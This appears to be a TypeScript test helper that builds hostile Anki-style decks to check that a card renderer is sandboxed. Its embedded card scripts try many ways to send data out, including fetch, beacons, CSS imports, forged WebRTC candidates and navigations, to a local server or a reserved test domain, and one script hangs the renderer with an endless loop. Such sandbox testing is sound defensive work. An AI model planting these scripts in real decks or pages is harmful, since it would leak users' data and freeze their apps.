/**
 * Hostile decks: real .apkg packages whose card templates run scripts that try to get data out of the card frame, or
 * to hang it. Built from the shared-latest fixture by rewriting note type templates (as the web app's rendering test
 * does). Each attempt records what the script itself observed in `<html data-results>`; the test servers record what
 * actually arrived.
 */
import { readFileSync } from "node:fs";
import { networkInterfaces } from "node:os";
import { readAnkiPackage, writeAnkiPackage } from "@wengu/anki";

import { fixture } from "./launch.ts";

export interface Endpoints {
  ip: string;
  http: number;
  tcp: number;
  udp: number;
}

/** Hostnames under this suffix appear only in deck code; finding one in a net log means a lookup was attempted. */
export const DNS_SUFFIX = "exfil.wengu-test.example";

/** A non-loopback IPv4 address of this machine (traffic to it is real egress from the renderer's point of view). */
export function hostIp(): string {
  const all = Object.values(networkInterfaces()).flat().filter((a) => a && a.family === "IPv4" && !a.internal);
  const priv = all.find((a) => /^(10|172\.(1[6-9]|2\d|3[01])|192\.168)\./.test(a!.address));
  return (priv ?? all[0])?.address ?? "127.0.0.1";
}

const common = (e: Endpoints) => `
var H = "http://${e.ip}:${e.http}", R = {};
function tag(k, v) { R[k] = v; document.documentElement.setAttribute("data-results", JSON.stringify(R)); }
function t(k, f) { try { f(); } catch (err) { tag(k, "threw " + (err && err.name)); } }
function front() { var f = document.querySelector(".front"); return f ? f.textContent : ""; }
`;

/** Every non-navigating way out we know of. */
function egressScript(e: Endpoints): string {
  return `${common(e)}
tag("ran", "yes");
t("fetch", function () { fetch(H + "/fetch?d=secret").then(function (r) { tag("fetch", "resolved " + r.status); }, function (x) { tag("fetch", "rejected " + x.name); }); tag("fetch", "pending"); });
t("fetch-no-cors", function () { fetch(H + "/fetch-no-cors?d=secret", { mode: "no-cors" }).then(function () { tag("fetch-no-cors", "resolved"); }, function (x) { tag("fetch-no-cors", "rejected " + x.name); }); });
t("xhr", function () { var x = new XMLHttpRequest(); x.open("GET", H + "/xhr?d=secret"); x.onload = function () { tag("xhr", "loaded"); }; x.onerror = function () { tag("xhr", "error"); }; x.send(); });
t("img", function () { var i = new Image(); i.onload = function () { tag("img", "loaded"); }; i.onerror = function () { tag("img", "error"); }; i.src = H + "/img?d=secret"; });
t("css-background", function () { var d = document.createElement("div"); d.style.cssText = "width:10px;height:10px;background-image:url(" + H + "/css-bg?d=secret)"; document.body.appendChild(d); tag("css-background", "set"); });
t("css-import", function () { var s = document.createElement("style"); s.textContent = "@import url(" + H + "/css-import?d=secret);"; document.head.appendChild(s); tag("css-import", "set"); });
t("font", function () { new FontFace("x", "url(" + H + "/font?d=secret)").load().then(function () { tag("font", "loaded"); }, function (x) { tag("font", "rejected " + x.name); }); });
t("audio", function () { var a = new Audio(); a.onerror = function () { tag("audio", "error"); }; a.src = H + "/audio?d=secret"; a.play().catch(function () {}); });
t("video-poster", function () { var v = document.createElement("video"); v.poster = H + "/poster?d=secret"; document.body.appendChild(v); tag("video-poster", "set"); });
t("websocket", function () { var w = new WebSocket("ws://${e.ip}:${e.http}/ws?d=secret"); w.onopen = function () { tag("websocket", "open"); }; w.onerror = function () { tag("websocket", "error"); }; });
t("eventsource", function () { var s = new EventSource(H + "/sse?d=secret"); s.onopen = function () { tag("eventsource", "open"); }; s.onerror = function () { tag("eventsource", "error"); s.close(); }; });
t("beacon", function () { tag("beacon", "returned " + navigator.sendBeacon(H + "/beacon", "secret")); });
t("webtransport", function () { if (typeof WebTransport === "undefined") return tag("webtransport", "unavailable"); var w = new WebTransport("https://${e.ip}:${e.http}/wt"); w.ready.then(function () { tag("webtransport", "ready"); }, function (x) { tag("webtransport", "rejected " + (x && x.name)); }); });
t("link-prefetch", function () { var l = document.createElement("link"); l.rel = "prefetch"; l.href = H + "/prefetch?d=secret"; document.head.appendChild(l); tag("link-prefetch", "set"); });
t("link-preload", function () { var l = document.createElement("link"); l.rel = "preload"; l.as = "fetch"; l.href = H + "/preload?d=secret"; document.head.appendChild(l); tag("link-preload", "set"); });
t("link-preconnect", function () { var l = document.createElement("link"); l.rel = "preconnect"; l.href = "http://preconnect.${DNS_SUFFIX}/"; document.head.appendChild(l); tag("link-preconnect", "set"); });
t("link-dns-prefetch", function () { var l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//dnsprefetch.${DNS_SUFFIX}"; document.head.appendChild(l); tag("link-dns-prefetch", "set"); });
t("anchor-href", function () { var a = document.createElement("a"); a.href = "http://anchor.${DNS_SUFFIX}/"; a.textContent = "link"; document.body.appendChild(a); tag("anchor-href", "set"); });
t("img-hostname", function () { var i = new Image(); i.onerror = function () { tag("img-hostname", "error"); }; i.src = "http://img.${DNS_SUFFIX}/x.png"; });
t("window.open", function () { var w = window.open(H + "/popup?d=secret"); tag("window.open", w ? "opened" : "null"); });
t("form-submit", function () { var f = document.createElement("form"); f.method = "post"; f.action = H + "/form"; f.target = "_blank"; document.body.appendChild(f); f.submit(); tag("form-submit", "submitted"); });
t("top-navigation", function () { top.location.href = H + "/top?d=secret"; tag("top-navigation", "no exception"); });
t("nested-iframe", function () { var f = document.createElement("iframe"); f.src = H + "/iframe?d=secret"; document.body.appendChild(f); tag("nested-iframe", "set"); });
t("worker", function () { var w = new Worker(URL.createObjectURL(new Blob(["fetch('" + H + "/worker')"], { type: "text/javascript" }))); tag("worker", "created"); w.onerror = function () { tag("worker", "error"); }; });
t("permissions", function () {
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) navigator.mediaDevices.getUserMedia({ audio: true }).then(function () { tag("getUserMedia", "granted"); }, function (x) { tag("getUserMedia", "rejected " + x.name); });
  else tag("getUserMedia", "unavailable");
  if (navigator.geolocation) navigator.geolocation.getCurrentPosition(function () { tag("geolocation", "granted"); }, function (x) { tag("geolocation", "error " + x.code); });
  tag("permissions", "asked");
});
t("webrtc-ice-servers", function () {
  var cands = [];
  var pc = new RTCPeerConnection({ iceServers: [
    { urls: "stun:${e.ip}:${e.udp}" },
    { urls: "turn:${e.ip}:${e.tcp}?transport=tcp", username: "secret", credential: "secret" },
    { urls: "turn:${e.ip}:${e.udp}?transport=udp", username: "secret", credential: "secret" },
    { urls: "stun:stun.${DNS_SUFFIX}:3478" }
  ] });
  pc.createDataChannel("x");
  pc.onicecandidate = function (ev) { if (ev.candidate) cands.push(ev.candidate.type + "/" + ev.candidate.protocol); else tag("webrtc-ice-servers", "gathering done: [" + cands.join(",") + "]"); };
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).then(function () { tag("webrtc-ice-servers", "gathering"); }, function (x) { tag("webrtc-ice-servers", "failed " + x.name); });
});
t("webrtc-forged-peer", function () {
  // A peer that never answered: ICE connectivity checks (STUN binding requests carrying our ufrag) go to the
  // address in the forged remote candidate.
  var pc = new RTCPeerConnection();
  pc.createDataChannel("x");
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o).then(function () { return o; }); }).then(function (o) {
    var sdp = o.sdp.replace(/a=setup:actpass/g, "a=setup:active").replace(/a=ice-ufrag:.*/g, "a=ice-ufrag:EXFILsecret").replace(/a=ice-pwd:.*/g, "a=ice-pwd:aaaaaaaaaaaaaaaaaaaaaaaa");
    sdp = sdp.replace(/(m=application[^\\r\\n]*\\r\\n)/, "$1a=candidate:1 1 udp 2122260223 ${e.ip} ${e.udp} typ host\\r\\na=candidate:2 1 tcp 1518280447 ${e.ip} ${e.tcp} typ host tcptype passive\\r\\n");
    return pc.setRemoteDescription({ type: "answer", sdp: sdp });
  }).then(function () { tag("webrtc-forged-peer", "remote set"); pc.oniceconnectionstatechange = function () { tag("webrtc-forged-peer", "ice " + pc.iceConnectionState); }; }, function (x) { tag("webrtc-forged-peer", "failed " + x.name + ": " + x.message); });
});
`;
}

/** Navigations destroy the document, so each note tries one kind (chosen by its text). */
function navScript(e: Endpoints): string {
  return `${common(e)}
var f = front();
setTimeout(function () {
  if (/France/.test(f)) { tag("nav", "location"); location.href = H + "/nav-location?d=secret"; }
  else if (/animal/.test(f)) { var a = document.createElement("a"); a.href = H + "/nav-click?d=secret"; document.body.appendChild(a); tag("nav", "click"); a.click(); }
  else { var m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + H + "/nav-refresh?d=secret"; document.head.appendChild(m); tag("nav", "refresh"); }
}, 200);
`;
}

/** The France note loops forever; every other note renders normally. */
function loopScript(): string {
  return `
document.documentElement.setAttribute("data-alive", "1");
if (/France/.test((document.querySelector(".front") || {}).textContent || "")) { document.documentElement.setAttribute("data-looping", "1"); for (;;) {} }
`;
}

export type HostileKind = "egress" | "nav" | "loop";

export async function hostilePackage(kind: HostileKind, e: Endpoints): Promise<{ bytes: Uint8Array; notes: { text: string; row: string }[] }> {
  const pkg = await readAnkiPackage(new Uint8Array(readFileSync(fixture("shared-latest.apkg"))));
  const script = kind === "egress" ? egressScript(e) : kind === "nav" ? navScript(e) : loopScript();
  const targets = kind === "nav" ? ["Basic", "Basic (and reversed card)"] : ["Basic"];
  for (const name of targets) {
    const nt = pkg.notetypes.find((n) => n.name === name)!;
    nt.templates[0]!.qfmt = `<div class="front">{{Front}}</div>\n<script>${script}</script>`;
  }
  const bytes = await writeAnkiPackage(pkg);
  const ids = new Map(pkg.notetypes.map((n) => [n.id, n.name]));
  // One note per rewritten note type, plus the image note of Basic (the nav script picks its attempt by note).
  const notes = targets
    .flatMap((name) => pkg.notes.filter((n) => ids.get(n.notetypeId) === name).slice(0, name === "Basic" ? 2 : 1))
    .map((n) => {
      const sort = String(n.sortField);
      const words = sort.split(/\s+/).filter(Boolean);
      return { text: words.find((w) => /^[A-Za-z]{6,}$/.test(w)) ?? words[0]!, row: sort.slice(0, 12) };
    });
  return { bytes, notes };
}
